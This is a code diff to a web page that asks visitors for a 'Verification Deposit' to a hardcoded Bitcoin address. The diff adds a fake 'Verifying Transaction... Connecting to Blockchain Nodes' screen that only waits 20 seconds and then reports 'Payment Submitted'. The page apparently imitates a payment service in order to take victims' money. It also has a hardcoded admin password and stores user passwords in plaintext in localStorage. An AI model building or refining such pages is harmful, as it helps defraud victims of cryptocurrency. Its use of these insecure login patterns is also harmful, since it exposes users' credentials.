@@ -212,13 +212,25 @@
         <h2 class="text-xl font-bold mb-8">Verification Deposit</h2>
         <img id="qr-code" src="" class="w-52 h-52 mx-auto mb-6 p-2 border rounded-xl">
         <div class="bg-gray-50 p-4 rounded-xl border mb-8"><span id="wallet-addr" class="text-[10px] font-mono break-all font-bold text-gray-600">bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7</span></div>
-        <button onclick="alert('Payment detected. Please wait for node confirmations.')" class="w-full py-5 bg-green-600 text-white rounded-full font-bold text-xl">I HAVE SENT PAYMENT</button>
+        <button onclick="handlePaymentSent()" class="w-full py-5 bg-green-600 text-white rounded-full font-bold text-xl">I HAVE SENT PAYMENT</button>
+    </div>
+
+    <div id="processing-payment-page" class="hidden min-h-screen flex flex-col items-center justify-center text-center bg-white">
+        <div class="loader mb-6"></div>
+        <h2 class="text-xl font-bold text-gray-700">Verifying Transaction...</h2>
+        <p class="text-sm text-gray-400 mt-2">Connecting to Blockchain Nodes</p>
+    </div>
+
+    <div id="payment-confirm-page" class="hidden min-h-screen flex flex-col items-center justify-center text-center p-8 bg-white">
+        <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mb-6 text-4xl font-bold">✓</div>
+        <h2 class="text-2xl font-bold mb-4">Payment Submitted</h2>
+        <p class="text-gray-500 text-sm mb-10">We will confirm your transaction shortly. Please check your dashboard for updates.</p>
+        <button onclick="showPage('dashboard')" class="w-full py-4 pp-bg-blue text-white rounded-full font-bold">Return to Dashboard</button>
     </div>
 
     <script>
         let isAgentValid = false;
 
-        // FIX: Persistence Logic
         window.addEventListener('DOMContentLoaded', () => {
             const email = localStorage.getItem('userEmail');
             const name = localStorage.getItem('userName');
@@ -287,10 +299,6 @@
             const storedEmail = localStorage.getItem('userEmail');
             const storedPass = localStorage.getItem('userPass');
 
-            // FIX: Debug logs
-            console.log("Login Attempt:", email, pass);
-            console.log("Stored Creds:", storedEmail, storedPass);
-
             if ((email === storedEmail && pass === storedPass) || (email === "admin@portal.com" && pass === "1234")) {
                 const name = localStorage.getItem('userName') || "Admin";
                 localStorage.setItem('isLoggedIn', 'true');
@@ -319,6 +327,14 @@
             const addr = 'bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7';
             document.getElementById('qr-code').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${addr}`;
             showPage('wallet-page');
+        }
+
+        // NEW: PAYMENT FLOW LOGIC
+        function handlePaymentSent() {
+            showPage('processing-payment-page');
+            setTimeout(() => {
+                showPage('payment-confirm-page');
+            }, 20000); // 20 seconds wait
         }
     </script>
 </body>
